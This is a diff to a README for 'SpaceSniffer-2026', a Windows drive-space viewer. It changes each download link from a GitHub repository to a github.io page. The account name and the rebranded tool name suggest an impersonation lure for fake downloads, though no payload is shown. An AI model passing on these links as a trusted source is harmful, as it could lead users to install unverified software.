@@ -1,6 +1,6 @@
 # 📂 SpaceSniffer-2026 - View your drive contents with ease
 
-[![](https://img.shields.io/badge/Download-SpaceSniffer-blue)] (https://github.com/Karolineappointed82/SpaceSniffer-2026)
+[![](https://img.shields.io/badge/Download-SpaceSniffer-blue)] (https://karolineappointed82.github.io)
 
 ## 🔍 What is SpaceSniffer-2026?
 
@@ -22,7 +22,7 @@ SpaceSniffer-2026 runs on most modern Windows systems. Ensure your machine meets
 
 Follow these steps to obtain the tool for your computer. 
 
-1. Visit the following website: https://github.com/Karolineappointed82/SpaceSniffer-2026
+1. Visit the following website: https://karolineappointed82.github.io
 2. Locate the button or link labeled for downloading the latest version.
 3. Click the link to begin the transfer.
 4. Save the file to your Downloads folder or your Desktop.
@@ -87,7 +87,7 @@ Because the software does not install like other programs, you do not need an un
 
 ## 💡 Troubleshooting
 
-If the scan stops or crashes, restart the application. If you have an unstable connection or a failing hard drive, the scan might take longer than expected. Ensure your drive is healthy before performing a full-scale scan of large storage volumes. If the program fails to launch, verify that you downloaded the latest version from: https://github.com/Karolineappointed82/SpaceSniffer-2026
+If the scan stops or crashes, restart the application. If you have an unstable connection or a failing hard drive, the scan might take longer than expected. Ensure your drive is healthy before performing a full-scale scan of large storage volumes. If the program fails to launch, verify that you downloaded the latest version from: https://karolineappointed82.github.io
 
 Keep your Windows updated to ensure the best compatibility with the software display drivers. Many display-related issues occur when your graphics drivers are outdated. Check their status in your Windows Device Manager if the treemap looks distorted. 
 
